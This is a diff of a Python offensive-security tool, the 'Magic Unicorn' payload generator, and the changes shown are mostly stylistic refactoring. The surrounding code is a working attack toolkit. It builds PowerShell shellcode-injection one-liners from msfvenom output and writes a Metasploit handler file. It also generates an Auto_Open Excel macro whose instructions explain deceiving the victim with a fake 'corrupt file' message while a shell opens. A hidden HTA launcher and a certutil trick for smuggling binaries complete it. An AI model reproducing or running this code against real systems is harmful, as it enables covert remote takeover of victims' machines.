@@ -23,12 +23,14 @@ import sys
 import os
 import shutil
 
-class bcolors:
-        CYAN = '\033[96m'
-        BLUE = '\033[94m'
-        RED = '\033[91m'
-        BOLD = '\033[1m'
-        ENDC = '\033[0m'
+
+class ColorsEnum:
+    CYAN = '\033[96m'
+    BLUE = '\033[94m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    ENDC = '\033[0m'
+
 
 # display unicorn banner
 def gen_unicorn():
@@ -41,7 +43,7 @@ def gen_unicorn():
                                    \|\_-\___ __-_`- /-/ \.
                                   |\_-___,-\_____--/_)' ) \
                                    \ -_ /     __ \( `( __`\|
-                                   `\__|      |"""+bcolors.RED+r"""\)\ """+bcolors.ENDC+r""") """+bcolors.RED+r"""/(/"""+bcolors.ENDC+r"""|
+                                   `\__|      |""" + ColorsEnum.RED + r"""\)\ """ + ColorsEnum.ENDC + r""") """ + ColorsEnum.RED + r"""/(/""" + ColorsEnum.ENDC + r"""|
            ,._____.,            ',--//-|      \  |  '   /
           /     __. \,          / /,---|       \       /
          / /    _. \  \        `/`_/ _,'        |     |
@@ -81,15 +83,15 @@ def macro_help():
 
 				-----MACRO ATTACK INSTRUCTIONS----
 
-For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do 
-that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code 
-into that. This will automatically run. Note that a message will prompt to the user saying that the file 
-is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the 
-victim to thinking the excel document is corrupted. You should get a shell through powershell injection 
+For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
+that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
+into that. This will automatically run. Note that a message will prompt to the user saying that the file
+is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
+victim to thinking the excel document is corrupted. You should get a shell through powershell injection
 after that.
 
-NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO 
-REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL 
+NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
+REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
 HAPPEN!
 
 [*******************************************************************************************************]
@@ -149,7 +151,7 @@ The certutil attack vector was identified by Matthew Graeber (@mattifestation) w
 a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to 
 a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim 
 machine through a fake certificate file. To use this attack, simply place an executable in the path of 
-unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once thats finished, 
+unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
 go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a 
 windows machine to convert it back to a binary. 
 
@@ -179,6 +181,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 [*******************************************************************************************************]
 	"""
 
+
 # usage banner
 def gen_usage():
     print "-------------------- Magic Unicorn Attack Vector v2.1.2-----------------------------"
@@ -202,30 +205,32 @@ def gen_usage():
 def split_str(s, length):
     return [s[i:i + length] for i in range(0, len(s), length)]
 
+
 # write a file to designated path
-def writefile(path, text):
-    filewrite = file(path, "w")
-    filewrite.write(text)
-    filewrite.close()
+def write_file(path, text):
+    file_write = file(path, "w")
+    file_write.write(text)
+    file_write.close()
+
 
 # generate full macro
-def genMacro(full_attack, LineLength=380):
+def generate_macro(full_attack, line_length=380):
     # start of the macro
     macro_str = "Sub Auto_Open()\nDim x\nx = "
 
-    if LineLength is None:
-        intLineLength = 380
+    if line_length is None:
+        line_length_int = 380
     else:
-        intLineLength = int(LineLength)
+        line_length_int = int(line_length)
 
-    powershell_command_list = split_str(full_attack, intLineLength)
+    powershell_command_list = split_str(full_attack, line_length_int)
 
     for line in powershell_command_list:
         macro_str += "& \"" + line + "\" _\n"
 
     # remove trailing "_ \r\n"
     macro_str = macro_str[:-4]
-    # remove first occurence of &
+    # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
 
     # end of macro
@@ -248,22 +253,23 @@ def gen_cert_attack(filename):
         data = file(filename, "rb").read()
         data = base64.b64encode(data)
         print "[*] Writing out the file to decode_attack/encoded_attack.crt"
-        writefile("decode_attack/encoded_attack.crt", "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
+        write_file("decode_attack/encoded_attack.crt",
+                   "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
         print "[*] Filewrite complete, writing out decode string for you.."
-        writefile("decode_attack/decode_command.bat", "certutil -decode encoded_attack.crt encoded.exe")
-        print "[*] Exported attackunder decode_attack/"
+        write_file("decode_attack/decode_command.bat", "certutil -decode encoded_attack.crt encoded.exe")
+        print "[*] Exported attack under decode_attack/"
         print "[*] There are two files, encoded_attack.crt contains your encoded data"
         print "[*] The second file, decode_command.bat will decode the cert to an executable."
     else:
         print "[!] File was not found. Exiting the unicorn attack."
         sys.exit()
 
-    # generate HTA attack method
+        # generate HTA attack method
 
 
 def gen_hta_attack(command):
     # HTA code here
-    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % (command)
+    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % command
     main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""
 
     # make a directory if its not there
@@ -271,22 +277,27 @@ def gen_hta_attack(command):
 
     # write out index file
     print "[*] Writing out index file to hta_attack/index.html"
-    writefile("hta_attack/index.html", main2)
+    write_file("hta_attack/index.html", main2)
 
     # write out Launcher.hta
     print "[*] Writing malicious hta launcher hta_attack/Launcher.hta"
-    writefile("hta_attack/Launcher.hta", main1)
+    write_file("hta_attack/Launcher.hta", main1)
+
 
 # generate the actual shellcode through msf
 def generate_shellcode(payload, ipaddr, port):
     print "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode..."
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen(
+        "msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
+            payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
-    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '', 'unsignedcharbuf[]=': ''}
+    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
+             'unsignedcharbuf[]=': ''}
     data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
     return data
+
 
 # generate shellcode attack and replace hex
 def gen_shellcode_attack(payload, ipaddr, port):
@@ -302,22 +313,24 @@ def gen_shellcode_attack(payload, ipaddr, port):
     # ultimate string
     newdata = ""
     for line in shellcode:
-        floater = floater + line
-        counter = counter + 1
+        floater += line
+        counter += 1
         if counter == 4:
             newdata = newdata + floater + ","
             floater = ""
             counter = 0
 
-    # heres our shellcode prepped and ready to go
+    # here's our shellcode prepped and ready to go
     shellcode = newdata[:-1]
 
     # write out rc file
-    writefile("unicorn.rc", "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (payload, ipaddr, port))
+    write_file("unicorn.rc",
+               "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (
+                   payload, ipaddr, port))
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (shellcode))
+        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
     return powershell_code
 
 
@@ -341,30 +354,30 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     if attack_type == "msf":
         if attack_modifier == "macro":
-            macro_attack = genMacro(full_attack)
-            writefile("powershell_attack.txt", macro_attack)
+            macro_attack = generate_macro(full_attack)
+            write_file("powershell_attack.txt", macro_attack)
             macro_help()
 
         elif attack_modifier == "hta":
             gen_hta_attack(full_attack)
-            shutil.move("unicorn.rc", "hta_attack/") # move unicorn to hta attack if hta specified
+            shutil.move("unicorn.rc", "hta_attack/")  # move unicorn to hta attack if hta specified
             hta_help()
 
         else:  # write out powershell attacks
-            writefile("powershell_attack.txt", full_attack)
+            write_file("powershell_attack.txt", full_attack)
             ps_help()
 
     elif attack_type == "custom_ps1":
         if attack_modifier == "macro":
-            macro_attack = genMacro(full_attack, option)
-            writefile("powershell_attack.txt", macro_attack)
+            macro_attack = generate_macro(full_attack, option)
+            write_file("powershell_attack.txt", macro_attack)
         else:
-            writefile("powershell_attack.txt", full_attack)
+            write_file("powershell_attack.txt", full_attack)
 
         custom_ps1_help()
 
     else:
-        writefile("powershell_attack.txt", full_attack)
+        write_file("powershell_attack.txt", full_attack)
         ps_help()
 
     # Print completion messages
@@ -378,6 +391,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     elif attack_type == "custom_ps1":
         print "[*] Exported powershell output code to powershell_attack.txt"
+
 
 # pull the variables needed for usage
 try:
@@ -408,7 +422,7 @@ try:
 
     # if we are using macros
     if len(sys.argv) == 5:
-        if attack_type == "msf": # msf macro attack
+        if attack_type == "msf":  # msf macro attack
             ipaddr = sys.argv[2]
             port = sys.argv[3]
             attack_modifier = sys.argv[4]
@@ -421,7 +435,7 @@ try:
 
     # default unicorn & custom ps1 macro attacks
     elif len(sys.argv) == 4:
-        if attack_type == "custom_ps1": # custom ps1 macro attack
+        if attack_type == "custom_ps1":  # custom ps1 macro attack
             attack_modifier = sys.argv[2]
             option = sys.argv[3]
             ps = gen_ps1_attack(ps1path)
@@ -432,6 +446,11 @@ try:
             attack_modifier = ""
             option = None
             ps = gen_shellcode_attack(payload, ipaddr, port)
+        # It should not be possible to get here, but just in case it does for some reason in the future, it will
+        # prevent usage of 'ps' and 'option', causing the app to crash
+        else:
+            print "[!] Something went way wrong while generating payload."
+            sys.exit()
 
         format_payload(ps, attack_type, attack_modifier, option)
 
